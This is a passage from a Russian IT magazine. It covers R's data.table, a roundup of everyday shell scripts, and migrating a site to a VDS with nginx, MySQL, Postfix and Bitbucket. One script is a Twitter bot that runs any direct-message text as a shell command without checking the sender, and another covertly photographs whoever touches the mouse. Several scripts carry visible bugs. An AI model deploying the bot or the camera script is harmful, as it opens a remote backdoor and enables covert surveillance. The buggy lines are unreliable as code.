        ект, и, обратившись к DT2, мы увидим там новую колонку. Это касается не толь-
      ко удаления и создания столбцов, так как data.table использует ссылки в том
      числе и для сортировки. Так что вызов setorder(DT3, "a") повлияет и на DT2.
        Для создания копии можно воспользоваться функцией:



      Теперь DT2 и DT3 — это разные объекты, и мы удалили столбец именно у DT3.

     by — блок для группировки данных
      Этот блок группирует данные наподобие group_by из пакета dplyr или GROUP
      BY в языке запросов SQL. Логика обращения к data.table с группировкой
      следующая:
        1. Блок i фильтрует строки из полного data.table.
        2. Блок by группирует данные, отфильтрованные в блоке i, по требуемым по-
         лям.
        3. Для каждой группы выполняется блок j, который может либо выбирать, либо
         обновлять данные.

      Блок заполняется следующим способом: by=list(переменные  для  груп-
      пировки), но, как и в блоке  j, list может быть заменен на точку, то есть
      by=list(a,  b) эквивалентно by=.(a,  b). Если необходимо группировать
      только по одному полю, можно опустить использование списка и написать на-
      прямую by=a:





     Самая частая ошибка тех, кто учится работать с data.table, — это примене-
      ние привычных по data.frame конструкций к data.table. Это очень больное
      место, и на поиск ошибки можно потратить очень много времени. Если у нас
      в переменных DF2 (data.frame) и DT2 (data.table) находятся абсолютно оди-
      наковые данные, то указанные вызовы вернут абсолютно разные значения:





      Причина этого очень проста:
      •  логика data.frame следующая — DF2[1:5,1:2] означает, что надо взять
        первые пять строк и вернуть для них значения первых двух колонок;
      •  логика data.table отличается — DT2[1:5,1:2] означает, что надо взять
        первые пять строк и передать их в блок j. Блок j просто вернет 1 и 2.

      Если надо обратиться к data.table в формате data.frame, необходимо явно
       указать это с помощью дополнительного параметра:





    СКОРОСТЬ ВЫПОЛНЕНИЯ
      Давай убедимся, что изучение этого синтаксиса имеет смысл. Вернемся к при-
      меру с большим файлом CSV. В train_DF загружен data.frame, а в train_
       DT, соответственно, data.table.
       В используемом примере place_id является целым числом большой длины
       (integer64), но об этом «догадался» только fread. Остальные методы загру-
      зили это поле как число с плавающей запятой, и нам надо будет явно провести
      преобразование поля place_id внутри train_DF, чтобы сравнить скорости.





      Допустим, перед нами поставлена задача посчитать количество упоминаний
      каждого place_id в данных.
       В dplyr с обычным data.frame это заняло 13,751 секунды:





     При этом data.table делает то же самое за 2,578 секунды:





      Усложним задачу — для всех place_id посчитаем количество, медиану по x
      и y, а затем отсортируем по количеству в обратном порядке. data.frame c
      dplyr справляются с этим за 27,386 секунды:





      data.table же справился намного быстрее — 12,414 секунды:





      Тестовые замеры времени выполнения простой группировки данных с помо-
     щью dplyr и data.table:





    ВМЕСТО ВЫВОДОВ
      Это все лишь поверхностное описание функцио-
      нальности data.table, но его достаточно, чтобы
      начать пользоваться этим пакетом. Сейчас раз-
      вивается пакет dtplyr, который позиционирует-       WWW
      ся как реализация dplyr для data.table, но пока                                                                      Очень советую почитать статьи,
      он еще очень молод (версия 0.0.1). В любом       входящие в состав пакета:
      случае понимание особенностей работы data.
                                                                        Небольшой обзор      table необходимо до того, чтобы пользоваться
      дополнительными «обертками».                                                                        Распространенные вопросы
                                                                               и ответы
UNIXOID
 СКРИПТУЕМ
                ПОЛЕЗНЫЕ
                  SHELL-СКРИПТЫ
                 НА ВСЕ СЛУЧАИ
               ЖИЗНИ  ВСЁ!





  Евгений Зобнин
  zobnin@gmail.com




Командная строка и те невообразимые вещи, которые
с ее помощью можно творить, — визитная карточка UNIX
и всех ее наследников. А где есть командная строка, там
есть скрипты. И сегодня... нет, мы не будем учиться пи-
сать скрипты, мы рассмотрим наиболее полезные из них,
те, что ты сможешь применять ежедневно для решения
самого разного круга задач, начиная от сводки погоды
и веб-сервера в одну строку и заканчивая ботом для твит-
тера в десять строк и скриптом для автоматического запу-
ска любого торрент-клиента.

Сразу оговорюсь, что я вовсе не приверженец шаманизма и ни в коем случае
не призываю тебя сидеть в зелено-черной консоли и набирать кучу букв, что-
бы выполнить действия, для которых в графическом интерфейсе достаточно
навести мышку на нужный элемент. Однако я убежден, что для решения мно-
гих задач консоль и скрипты годятся гораздо лучше графического интерфейса
и поэтому пренебрегать ими никак нельзя. Тем более что любая DE позволяет
создать для скрипта иконку, так что для его запуска даже не надо будет откры-
вать консоль.

ПРОСТЫЕ ПРИМЕРЫ
Итак, не разглагольствуя понапрасну, сразу перейдем к примерам:

$ curl ifconfig.co

Эта простая команда покажет тебе внешний IP — идеальный вариант, если
в Сеть ты ходишь через роутер. Все, что она делает, — просто обращается
к серверу ifconfig.co, который возвращает обратно IP-шник одной строкой
вместо полноценной веб-страницы.
  И да, это вовсе не скрипт, это просто команда, но, чтобы превратить ко-
манду в скрипт, достаточно поместить ее в текстовый файл и первой строкой
добавить так называемый шебанг, то есть символы #!, за которыми следует
имя командного интерпретатора:

#!/bin/bash
curl ifconfig.co

Далее скрипт сохраняем в каталог ~/bin и назначаем права на исполнение:

$ chmod +x ~/bin/myip.sh

Теперь его можно вызывать из командной строки командой myip.sh.
Идем дальше.

#!/bin/sh
curl -4 wttr.in/Moscow

Этот скрипт позволяет получить сводку погоды на четыре дня. Принцип тут та-
кой же, как в случае с ifconfig.co.





                                                      Сводка погоды в консоли

#!/bin/sh
dig +short txt $1.wp.dg.cx

А так можно получить краткое описание чего-либо в Википедии, причем с по-
мощью DNS-запроса вместо обращения к веб-серверу. Кстати, веб-сервер
через командную строку тоже очень легко создать:

#!/bin/sh
while ( nc -l 80 < file.html > : ) ; do : ; done

Данный скрипт основан на утилите netcat (nc), которую называют швейцарским
армейским ножом для сетевых операций. Скрипт запускает цикл, выполняю-
щий команду nc, которая слушает 80-й порт и в ответ на запрос отдает file.html,
отправляя переданный запрос в никуда (символ означает noop, то есть пустую
операцию).
  С помощью простых скриптов и команд можно запросто слушать интер-
нет-радио:

#!/bin/sh
mpv --volume=50 -playlist ~/16bit.fm_128.m3u

Естественно, плей-лист в формате M3U необходимо заранее скачать с сай-
та радиостанции. Кстати, если запустить MPlayer с аргументом --input-ipc-
server=/tmp/mpvsocket, им можно будет управлять, записывая команды в файл.
Например, настроить громкость:

echo 'volume +10' | socat - /tmp/mpvsocket

Создай два скрипта: один для запуска, другой для остановки радио (со строкой
killall mpv), повесь их на рабочий стол и настрой горячие клавиши DE на управ-
ление воспроизведением. Вуаля, у тебя готов плеер для интернет-радио, за-
пустить который можно, просто кликнув по иконке на рабочем столе. И он поч-
ти не будет расходовать память или занимать трей.
  Но отвлечемся от сетевых операций и вернемся к локальным делам.

#!/bin/sh
tar -czf "../${PWD##*/}.tar.gz" .

Это один из моих любимых скриптов. Он создает архив tar.gz текущего ката-
лога. Особого внимания здесь заслуживает конструкция ${PWD##*/}, которая
берет полный путь до текущего каталога (переменная $PWD) и удаляет из него
первую часть вплоть до последнего слеша, оставляя, таким образом, толь-
ко имя самого каталога. Далее к нему добавляется расширение tar.gz. Более
подробно о таких конструкциях ты можешь прочитать в man bash.

#!/bin/sh
while true; do
    inotifywait -r -e MODIFY КАТАЛОГ && ТВОЯ_КОМАНДА
done

А это уже скрипт, который запускает команду в ответ на изменение файлов
в каталоге. Ее можно использовать для множества разных целей, например
для автоматического включения плеера при сохранении MP3-файла. Или про-
сто выводить уведомление на десктоп, используя в качестве команды notify-
send:

notify-send "Файл изменен"


ДЕСКТОП
Раз уж мы заговорили о десктопе, то продолжим. Как и консоль, его тоже мож-
но заскриптовать. Вот, например, скрипт, загружающий случайные обои, опу-
бликованные на reddit-канале wallpaper:

#!/bin/bash
wget -O - http://www.reddit.com/r/wallpaper |\
    grep -Eo 'http://i.imgur.com[^&]+jpg' |\
    shuf -n 1 |\
    xargs wget -O background.jpg
feh --bg-fill background.jpg

Здесь все просто. С помощью wget скрипт загружает страницу www.reddit.
com/r/wallpaper, передает ее grep, который ищет на ней ссылки на imgur, вы-
бирает случайную ссылку с помощью shuf, загружает ее опять же с помощью
wget и устанавливает в качестве обоев, используя команду feh (это такой ми-
ниатюрный просмотрщик изображений, его нужно предварительно устано-
вить). Скрипт можно добавить на рабочий стол, и тогда по клику у тебя будут
меняться обои.

#!/bin/sh
state=`synclient | grep TouchpadOff | cut -d '=' -f 2`
if [ $state = "1" ]; then
    synclient TouchpadOff=0
else
    synclient TouchpadOff=1
fi

А это скрипт для включения/выключения тачпада ноутбука: включает, если от-
ключен, и наоборот. В своей работе использует утилиту synclient, позволяю-
щую управлять тачпадами производства Synaptics (90% тачпадов делают они).
При запуске без аргументов утилита выводит различную информацию о тачпа-
де, в том числе строку TouchpadOff = 1, если он активирован, и TouchpadOff =
2, если отключен. Скрипт находит это значение и в зависимости от состояния
тачпада включает или отключает его.

!#/bin/bash
mpv tv:// -frames 3 -vo jpeg
mv 00000003.jpg photo.jpg
rm -f 0000*.jpg

А так можно сделать снимок с помощью веб-камеры. Скрипт использует виде-
оплеер mpv, чтобы записать первые три кадра, снятые камерой, в JPEG-файлы
с именами 0000000.jpg, 00000002.jpg, 00000003.jpg, затем переименовывает
третий снимок в файл photo.jpg, а остальные удаляет. Три снимка необходи-
мы для того, чтобы камера успела провести инициализацию, обычно первые
два получаются просто черными. Иногда изображение выходит перевернутым;
чтобы это исправить, mpv следует запускать с флагом -vf flip:

$ mpv tv:// -frames 3 -vf flip -vo jpeg

Ту же самую команду можно использовать для создания полноценной камеры
слежения, которая делает снимки в моменты, когда юзер прикасается к мыши:

#!/bin/bash
while true; do
    sudo cat /dev/input/mouse0 | read -n1
    mpv tv:// -frames 3 -vo jpeg
    mv 00000003.jpg `date +%F-%H-%M`.jpg
    rm -f 0000*.jpg
    sleep 10
done

Скрипт входит в бесконечный цикл, ожидая данные на устройстве /dev/input/
mouse0. Если данные есть, значит, мышь сдвинулась или была нажата одна
из ее клавиш. После этого он использует mpv, чтобы сделать три снимка, дает
третьему снимку имя текущей даты и удаляет остальные.
   Для записи полноценного видео с веб-камеры можно использовать такой
скрипт:

#!/bin/bash
mencoder tv:// -tv driver=v4l2:width=800:height=600:device=/dev/
    video0:fps=30:outfmt=yuy2:forceaudio:alsa:adevice=hw.2,0
    -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=1800 -ffourcc xvid
    -oac mp3lame -lameopts cbr=128 -o video.avi

В результате ты получишь video.avi в формате MPEG4 с битрейтом 1800 и ау-
диодорожкой в формате MP3 с битрейтом 128.

#!/bin/bash
ffmpeg -f x11grab -r 25 -s 1366x768 -i :0.0 screencast.mpg

А так ты можешь записать скринкаст. 1366x768 — разрешение рабочего сто-
ла. Просто сделать скриншот отдельного окна всегда можно с помощью ко-
манды import:

import screenshot.png

После ее запуска значок мыши изменится на «прицел», с помощью которо-
го можно выбрать окно. Повесив эту команду на клавиатурную комбинацию,
ты получишь практически идеальную систему снятия скриншотов, абсолютно
не жрущую память, как это делают специализированные приложения, постоян-
но висящие в трее.
Подключить и настроить внешний монитор тоже можно из командной строки:

#!/bin/sh
if [ -z "$1" ]; then
    exit
fi
if [ $1 == "off" ]; then
    xrandr --output VGA-0 --off
    xrandr -s 0
else if [ $1 == "on"]; then
    xrandr --output LVDS --auto --primary --output VGA-0 --auto
        --left-of LVDS
    xrandr --newmode "1920x1080" 173.00 1920 2048 2248 2576 1080
        1083 1088 1120 -hsync +vsync
    xrandr --addmode VGA-0 1920x1080
    xrandr --output VGA-0 --mode 1920x1080
fi
xrandr --dpi 96

Данный скрипт предполагает, что основной монитор носит имя LVDS, а внеш-
ний — VGA-0. Это стандартная ситуация для ноутбуков; если ты не уверен, мо-
жешь проверить вывод команды xrandr: при передаче скрипту аргумента off
он отключает внешний монитор, аргумент on, в свою очередь, включает его,
располагая по левую сторону от основного (аргумент --left-of LVDS в первой
команде). Далее скрипт добавляет новую конфигурацию для монитора с раз-
решением 1920 x 1080 и активирует его. В самом конце скрипт устанавливает
дефолтное значение DPI — как показывает практика, при подключении мони-
тора с другим разрешением оно часто слетает.
  На самом деле в большинстве случаев команды xrandr --newmode  ...
и xrandr --addmode ... не нужны, так как Xorg может получить конфигурацию мо-
нитора и поддерживаемые им разрешения с помощью EDID. Иногда, однако,
этого не происходит, и строку конфигурации, указываемую после аргумента
--newmode, приходится генерировать самостоятельно с помощью инструмен-
та cvt:

$ cvt 1920 1080

Он же поможет сгенерировать нестандартное разрешение, «не поддерживае-
мое» монитором по умолчанию.

GOOGLE, TWITTER, DROPBOX И ТОРРЕНТЫ
Отвлечемся от десктопных дел и поговорим о сетевых сервисах. Начнем, раз-
умеется, с Google. Вот так будет выглядеть скрипт для получения первых деся-
ти результатов поиска:

#!/bin/bash
Q="$@"
URL='https://www.google.de/search?tbs=li:1&q='
AGENT="Mozilla/4.0"
stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}${Q//\ /+}" | grep
    -oP '\/url\?q=.+?&amp' | sed 's|/url?q=||; s|&amp||')
echo -e "${stream//\%/\x}"

Скрипт делает запрос к Google с помощью уже знакомого нам curl, заменяя
пробелы в поисковой строке на плюсы. Далее выискивает в ответном HTML
ссылки и выводит их на экран. Все просто, хоть и кажется сложным.





                                     Ищем в Google из командной строки


Второй популярный сервис — YouTube:

#!/bin/bash
mpv -fs -quiet `youtube-dl -g "$1"`

Здесь все совсем просто. Скрипт всего лишь проигрывает видео с указанным
в аргументе ID с помощью плеера mpv. Естественно, youtube-dl придется уста-
новить заранее.
   Как насчет твиттера? Нет проблем, вот полноценный бот, который на вхо-
де принимает команду, выполняет ее с помощью командного интерпретатора
и отправляет результат указанному юзеру.

#!/bin/bash
USER="ТВОЙ_НИК"
while true; do
    CMD=`echo "/dma +1" | ttytter -script | sed 's/\[.*\]\ //'
    if [ $CMD != $OLD_CMD ]; then
        REPL=`$CMD`
        echo "/dm $USER ${REPL:0:140}" | ttytter -script
        CMD = $OLD_COMD
        fi
    sleep 60
done

Скрипт использует консольный клиент ttytter, читая в цикле последнее direct
message, далее он проверяет, не была ли такая команда уже выполнена, и,
если нет, выполняет ее и отправляет указанному в переменной USER пользо-
вателю, попутно обрезая до 140 символов.
   Чтобы все заработало как надо, тебе придется установить ttytter, запустить
его, ввести приведенную им ссылку в адресную строку браузера, скопировать
показанный браузером ключ аутентификации и ввести его в ttytter. Естествен-
но, перед тем как это сделать, следует завести для бота отдельного юзера
и залогиниться под его учеткой.





                                                                     Ttytter запрашивает ключ

Твиттер можно использовать не только для выполнения команд, но и для мо-
ниторинга машины. Следующий скрипт отправляет в ленту сообщение с ин-
формацией о состоянии машины (имя хоста, uptime, нагрузка, свободная па-
мять и нагрузка на CPU):

#!/bin/bash
HOST=`hostname -s`
UP=`uptime | cut -d" " -f4,5 | cut -d"," -f1`
LOAD=`uptime | cut -d":" -f5,6`
MEM=`ps aux | awk '{ sum += $4 }; END { print sum }'`
CPU=`ps aux | awk '{ sum += $3 }; END { print sum }'`
tweet="Host: ${HOST}, uptime: ${UP}, cpu: ${CPU}%, memory:
    ${MEM}%, loadavg ${LOAD}"
if [ $(echo "${tweet}" | wc -c) -gt 140 ]; then
    echo "FATAL: The tweet is longer than 140 characters!"
    exit 1
fi
echo $tweet | ttytter -script





                                          Мониторинг машины с помощью Twitter

Ну и под конец приведу скрипт, не связанный с сетевыми сервисами, но имею-
щий прямое отношение к сетям и к тому, зачем мы обычно их используем. Это
скрипт для запуска и остановки торрент-клиента во время простоя машины:

#!/bin/bash
IDLE=600000
STOPCMD="transmission-remote -S"
STARTCMD="transmission-remote -s"
STOPPED="yes"
while true; do
    if [ `xprintidle` -gt $IDLE ]; then
        if [ $STOPPED = "yes" ]; then
            $STARTCMD
            STOPPED="no"
                fi
    else
        if [ $STOPPED = "no" ]; then
            $STOPCMD
            STOPPED="yes"
                fi
        fi
    sleep 60
done

Скрипт уходит в бесконечный цикл, каждую минуту проверяя, сколько милли-
секунд прошло с момента, когда юзер что-либо делал (для этого использует-
ся команда xprintidle). Если прошло уже 600 000 мс (десять минут), скрипт вы-
полняет команду, указанную в переменной STARTCMD. В противном случае он
выполнит команду STOPCMD, но только тогда, когда до нее была выполнена
команда STARTCMD. Если кратко: ничего не делаешь за компом десять ми-
нут — запускается STARTCMD, в данном случае это команда запуска всех за-
качек с помощью Transmission, если нет — приостановка всех закачек. Не лю-
бишь Transmission? Нет проблем, вот команды для Deluge:

STOPCMD="deluge-console pause \*"
STARTCMD="deluge-console resume \*"


ВМЕСТО ВЫВОДОВ
Не удивлюсь, если все описанное в статье покажется тебе очередным велоси-
педостроением, и даже соглашусь с таким мнением. Все-таки современный
Linux — это не та система для сумасшедших экспериментаторов, какой она
была пятнадцать лет назад. Сегодня для каждой задачи можно найти отдель-
ный, отлаженный и хорошо работающий инструмент, в том числе графический.
Другое дело, что не совсем понятно, стоит ли захламлять систему тяжеловес-
ными написанными на Python приложениями с кучей зависимостей, когда ту
же задачу легко решить с помощью простенького скрипта.
   Каким путем пойти — выбирать тебе. Встанешь ли ты на темную сторону
или выберешь путь джедая?

telnet towel.blinkenlights.nl
SYNACK
САМ СЕБЕ
АДМИН
УЧИМСЯ НАСТРАИВАТЬ VDS
И ПЕРЕНОСИТЬ САЙТЫ





В интернете сегодня можно не только раз-
влекаться, но и учиться, работать и зараба-
тывать. Количество сайтов растет ежесе-
кундно, услуги хостинга также становятся                «urban.prankster»Мартин
привлекательными и множатся как грибы             prank.urban@gmail.comПранкевич
после дождя. Бывает, что хостер оправды-
вает все ожидания, но иногда приходится
и переезжать. Можно нанять фрилансера, но лучше нау-
читься делать это самому. Сегодня тебя ждет небольшая
инструкция именно на этот случай.

ПОСТАНОВКА ЗАДАЧИ
Ситуация самая жизненная. Интернет-магазин, размещенный на шаред-хо-
стинге, после запуска начал получать клиентов, но появились пожелания
к функциональности, и разработчики активно занялись доработкой сайта. Вы-
яснилось, что, когда в этом участвует несколько человек, постоянно копиро-
вать файлы через FTP для теста, да и еще на рабочий сайт, очень проблемно.
Терялся контроль, кто когда что сделал, нужно было беспокоиться о сохра-
нении оригинальных файлов, чтобы было легко откатиться. Владельцу прихо-
дилось или согласовывать правки, или копировать все самому. Разработчик
не мог сразу посмотреть результат и ждал. Процесс сильно тормозился. В ито-
ге пришли к тому, что нужно использовать возможности Git и создать новый
сайт-зеркало, где можно было бы все обкатывать. При такой схеме разработ-
чик мог сразу тестировать код, а в случае одобрения код переносили в master
и выкладывали уже на рабочий сайт. Также можно легко отслеживать коммиты.
   Вторая проблема: хостинг постоянно падал. Причину в итоге нашли: Entry
processes limit — параметр, который определяет количество CGI/PHP-процес-
сов, входящих внутрь виртуального контейнера, и о котором не сильно любят
говорить маркетологи хостера. На графиках его тоже не видно, только малень-
кая графа в таблице. В итоге при небольших нагрузках CPU и RAM (не более
20%) сервер вообще не работал даже при минимальном количестве посети-
телей. В итоге было принято решение переезжать.

ПЕРВОНАЧАЛЬНЫЕ НАСТРОЙКИ СЕРВЕРА
OC в VDS устанавливается автоматически. Достаточно выбрать версию и ва-
риант с веб-панелью или без и чуть подождать, пока не придет письмо с дан-
ными для входа. На хостингах предлагаются и разные веб-панели. Когда этот
материал создавался, Vesta не поддерживала Ubuntu 16.04 и необходимости
в ней не было, поэтому выбрали чистую систему. Все дальнейшие действия
ведутся от имени root. Первым делом проверяем локаль, часовой пояс и вре-
мя. Вообще, веб-приложения обычно не обращают внимания на некоторые
системные настройки, но иногда попадается именно тот случай, поэтому луч-
ше сразу сделать все правильно.

# locale

Если в ответ получаем отличное от ru_RU.UTF — перенастраиваем.

# locale-gen ru_RU ru_RU.UTF-8 ru_RU ru_RU.UTF-8
# localedef -c -i ru_RU -f UTF-8 ru_RU.UTF-8
# dpkg-reconfigure locales
# update-locale LANG=ru_RU.UTF-8

Проверяем время:

# date

Если часовой пояс не соответствует — переконфигурируем.

# dpkg-reconfigure tzdata

Обновляем сервер:

# apt update && apt upgrade

Теперь можем ставить сервисы.





                                                    Настраиваем часовой пояс

СТАВИМ ВЕБ-СЕРВЕР
Несмотря на их разнообразие, выбор установки обычно сводится к трем ва-
риантам: Apache, nginx или nginx как реверс Apache. Apache очень гибок в на-
стройках и использует модули для обработки динамических запросов, поэтому
хорошо справляется с динамикой. Nginx хорош в отдаче статики и потребляет
меньше ресурсов, но для обработки динамики использует сторонний модуль,
что снижает скорость и чуть усложняет настройки. В зависимости от конкрет-
ного приложения каждый из них может иметь свои плюсы и минусы и показы-
вать разную скорость. Поэтому окончательный выбор веб-сервера всегда при-
ходится подтверждать практикой, подбирая оптимальный вариант. Проблема
nginx — то, что в некоторых специфических движках следует вручную возиться
с редиректами, когда на Apache все будет работать буквально из коробки, до-
статочно просто включить mod_rewrite.
   Нагрузочное тестирование можно произвести при помощи ab (Apache
Benchmark, входит в  apache2-utils) или  siege. Причем лучше проверить
с localhost и удаленного узла, чтобы видеть, как работает сеть.

# ab -c 10 -n 6000 http://example.org/

Хотя ab — это скорее для себя, чтобы оценить эффективность установок.
Человека со стороны обычно интересует только то, что показывает Google
PageSpeed, поэтому ориентироваться следует и на него.
  В последнем случае сайт на старом хостинге давал 60, после перено-
са на VDS (с такими же параметрами) он в Apache в установке по умолчанию
показывал 72, nginx с голым конфигом — 62, после добавления сжатия — 78.
На этом и остановились, выбрали nginx. В репозитории несколько пакетов,
для большинства ситуаций достаточно базового core, содержащего все ос-
новные модули, для PHP нам понадобится FPM.

# apt nginx install nginx php7.0-fpm

Файл в общем стандартный, но для скорости добавим кеширование и сжатие.
Точные параметры в каждом случае необходимо подбирать опытным путем,
но для небольших и средних проектов таких установок обычно бывает доста-
точно. В nginx.conf добавляем или, если повезло, снимаем комментарии в сек-
ции http:





Создаем настройки для домена:





Это общий пример для стандартного движка. Некоторые движки вроде
OpenCart или WebAsyst требуют специфических настроек, и даже не всегда
работает то, что предлагается в Сети.
   Проверяем, работает ли сжатие. Это можно сделать, просмотрев заголо-
вок Content-Encoding в Firebug (он должен показывать gzip), или при помощи
специального сервиса.
Включаем сайт:

# ln -s /etc/nginx/sites-available/example.org /etc/nginx/sites-
    enabled/example.org

Перезапускаем nginx:

# service nginx restart

Но работать еще не будет. Нужно настроить PHP. Для FPM все установки на-
ходятся в /etc/php/7.0/fpm. Проверяем, что в pool.d/www.conf учетная запись
совпадает с используемой nginx и включен сокет.

# nano /etc/php/7.0/fpm/pool.d/www.conf
user = www-data
group = www-data
listen = /run/php/php7.0-fpm.sock

Кроме этого, можно обратить внимание на параметры, определяющие коли-
чество процессов, которые будут обслуживать PHP-запросы.

pm = dynamic
pm.max_children = 15
pm.start_servers = 6
pm.min_spare_servers = 2
pm.max_spare_servers = 6

На чуть загруженных серверах может не хватать количества процессов. В ло-
гах об этом сразу скажут.

# cat /var/log/php7.0-fpm.log
WARNING: [pool www] server reached pm.max_children setting (5),
consider raising it

Еще важный файл php.ini. Параметров там много, и можно рассказывать дол-
го. Но изначально следует включить сжатие, установить максимальный размер
файла на аплоад, подключить mail(), сессии и очень желательно включить ак-
селератор OPcache.





Обязательно проверяем права доступа на /var/lib/php/sessions, чтобы туда мог
писать nginx, иначе сессии не будут образовываться. Перезапускаем.

# service php7.0-fpm restart

Теперь перенос сайта. Если переносим с другого хостинга, то там создаем
бэкап. Если есть хостинговая веб-панель, то можно использовать ее возмож-
ности. Или вручную:

# tar -zcvf backup.tar.gz /var/www

И на новом месте распаковываем:

# tar -zxvf backup.tar.gz /var/www

Но для сайта нам нужна СУБД.





                              Проверяем сжатие отдаваемых веб-сервером данных

СТАВИМ MYSQL
C MySQL все очень просто. Вводим

# apt install mysql-server

На запрос указываем пароль root, и уже можно работать. Если не требуется
доступ к нему извне, то следует разрешить использовать только локалхост или
сокет.





После изменений перезапускаем:

# service mysql restart

Остальные параметры обычно настроены оптимально для большинства нена-
груженных узлов. В процессе работы следует смотреть за журналами и значе-
ниями текущих переменных.

# mysqladmin -uroot -p extended-status

Вероятно, что-то придется подкрутить. Для быстрой оптимизации лучше вос-
пользоваться советами, выдаваемыми скриптом MySQLTuner, который есть
в репозитории.





                              Скрипт MySQLTuner позволяет оптимизировать MySQL

Переносим базу. Архивируем на старом хосте базу данных через phpMyAdmin
или вручную:

# mysqldump -uroot -p workbase > base.sql

Если нужны все базы, то используем ключ -A. Копируем на новый сервер. Соз-
даем базу workbase, импортируем старые данные и создаем учетную запись
baseadmin для работы с этой базой:

# mysql -uroot -p
mysql> CREATE DATABASE workbase;
mysql> use workbase;
mysql> source base.sql;
mysql> GRANT ALL PRIVILEGES ON workbase.* to 'baseadmin'@'localhost'
    IDENTIFIED BY 'password';

Заодно добавим учетку с меньшими правами для бэкапа.

mysql> GRANT SELECT, LOCK TABLES ON *.* to 'backup'@'localhost'
    IDENTIFIED BY 'backup_pass';
mysql> FLUSH PRIVILEGES;

Настраиваем подключение к БД в параметрах движка, и можно работать.

ПОЧТОВЫЙ СЕРВЕР
Хотя некоторые приложения могут напрямую подключаться к внешнему SMTP
(что очень даже хорошо: в случае взлома провайдер не забанит аккаунт из-за
рассылки спама), но в большинстве приложений для отправки почты использу-
ют функцию mail(), а поэтому нам потребуется локальный SMTP-сервер. Здесь
опять два варианта: настроить полноценный сервер или установить прокси,
который будет подменять SMTP, переправляя запросы на внешний сервер
(потребуется почтовый ящик). В качестве последнего отлично подходит ssmtp,
который есть в репозитории. Хотя установить «большой» сервер в минималь-
ной конфигурации — дело пяти минут.

# apt install postfix

В процессе выбираем «Интернет-сайт» и указываем домен.





Перезапускаем:

# service postfix restart

И почта должна уже работать. Единственный момент — если почтовый ящик
домена привязан к Gmail, то, когда в него идет письмо с этого же домена, тех-
нология DMARC Gmail может его отбросить как спам. Хотя если отправитель
будет другой, то все будет работать. В этом случае следует убедиться, что
SMTP-сервер не отправляет hostname, которое дал серверу хостер. Строку
mydestination следует изменить на

mydestination = $mydomain, localhost.$mydomain, localhost





                                           Настройки Postfix во время установки

МОНИТОРИНГ И БЭКАП
Две важные вещи — мониторинг и бэкап. После установки сайт может падать
из-за неоптимальных настроек. Поэтому лучше сразу установить хотя бы про-
стое решение, позволяющее перезапускать сервисы. В репозиториях есть
отличные утилиты healt-check или monit, проверяющие не только сервисы,
но и общее состояние системы. Настроек там много, и на первых порах или
на легких сайтах можно обойтись простеньким скриптом. Для nginx он будет
выглядеть примерно так:





По аналогии можно добавить контроль MySQL, PHP-FPM и SMTP-сервера.
   Решений для бэкапа в репозитории больше чем достаточно, в зависимости
от ситуации и наличия ресурсов можно подобрать себе любой по вкусу. В са-
мом простом случае можно использовать самописный скрипт, который будет
собирать папки /etc, веб-серверы и SQL-базы и отправлять их на FTP. Файлы
будем хранить неделю. Чтобы файлы удалялись автоматически, в имени будем
использовать остаток от деления, тогда новый файл с таким же именем будет
перезатираться. В нашем примере будем делить на 7.





Прогоняем первый раз оба файла вручную, чтобы убедиться в их работоспо-
собности. И добавляем задачи в /etc/crontab. Мониторить будем каждые де-
сять минут, резервную копию будем создавать ежедневно в 20:00.





Перезапускаем cron:

# service cron restart

На данный момент мы имеем полностью настроенный веб-сервер.



                           Продолжение статьи
SYNACK



        Начало статьи
САМ СЕБЕ
                       УЧИМСЯ
                         НАСТРАИВАТЬ VDS
                      И ПЕРЕНОСИТЬ САЙТЫАДМИН





ПОДКЛЮЧАЕМСЯ К BITBUCKET
Вся изюминка переноса состояла в использовании при разработке веб-сайта
Git. Выглядело интересно, осталось только это все реализовать. Здесь мож-
но пойти несколькими путями. Самый, наверное, простой — инициализиро-
вать локальный репозиторий и позволить разработчику при коммите выклады-
вать файлы прямо на сервер. Минус здесь — мы фактически даем ему доступ
на сервер. Поэтому лучше перестраховаться, и самым правильным вариантом
будет использовать посредника с возможностью автоматического pull файлов
после коммита. Так мы получаем еще один источник бэкапа. В качестве про-
межуточного сервиса был выбран сервис «ведро битов» Bitbucket, предлага-
ющий всякие вкусности вроде бесплатных «private»-репозиториев и удобного
интерфейса. Хотя, в принципе, это может быть любой другой подобный сер-
вис — GitHub или Google Cloud Source Repositories.
   Механизм взаимодействия будет простым. Создаем репозиторий (мож-
но в отдельной теме), инициализируем Git прямо в корне сайта (как вариант,
можно переносить с другого каталога, но это не так интересно), добавляем
удаленный репозиторий Bitbucket и подключаем сервер к аккаунту Bitbucket.
Чтобы коммит на Bitbucket сразу попадал на веб-сайт, будем использовать
механизм хуков. Сам Git предоставляет такую возможность, а в Bitbucket есть
даже два варианта.
   Для пула можно использовать протокол HTTPS или Git — ставить эту схему
в уже рабочий сайт или разворачивать с нуля. В случае HTTPS меньше настро-
ек, просто после инициализации подключаем удаленный репозиторий и в по-
следующем тянем из него изменения.

# git init
# git clone https://аккаунт@bitbucket.org/тема/репозиторий.git .

Но если придется экстренно вносить правки в файлы вручную, то возможен
конфликт при будущих pull. Если же используем SSH, то настроек чуть боль-
ше, но зато, поправив файл, можем сразу сделать commit, избежав возможных
проблем.

# git commit -a -m "wp-config correction"

Для подключения через Git/SSH нужно на Bitbucket загрузить публичный ключ.
Генерируем:

# ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

В качестве имени вводим bitbucket, чтобы не путаться. На запрос пароля жмем
ввод. Меняем сразу права, иначе будет ругаться.

# chmod 0600 ~/.ssh/bitbucket

Проверяем, работает ли ssh-agent:

# eval "$(ssh-agent -s)"
Agent pid 7782

Добавляем ключ:

# ssh-add ~/.ssh/bitbucket
Enter passphrase for /root/.ssh/bitbucket:
# ssh-add -l

Смотрим, чтобы в ~/.ssh/config была информация для идентификации хоста
Bitbucket:




Добавляем публичный ключ bitbucket.pub на Bitbucket в настройках учетной за-
писи «Безопасность -> SSH-ключи». После этого должны заходить ssh -Tvv
git@bitbucket.org без пароля. Теперь у нас два варианта: пустой или рабо-
чий сайт. Если сайт пустой, а репозиторий содержит данные, то просто делаем

# git clone git@bitbucket.org:аккаунт/тема/репозиторий.git

Это вариант самый беспроблемный, так как сайт фактически ставим с нуля
и не будет конфликтов между локальными файлами и теми, что уже есть в ре-
позитории. В других случаях следует инициализировать репозиторий и доба-
вить удаленный.

# git init
# git remote add origin git@bitbucket.org:аккаунт/тема/
    репозиторий.git

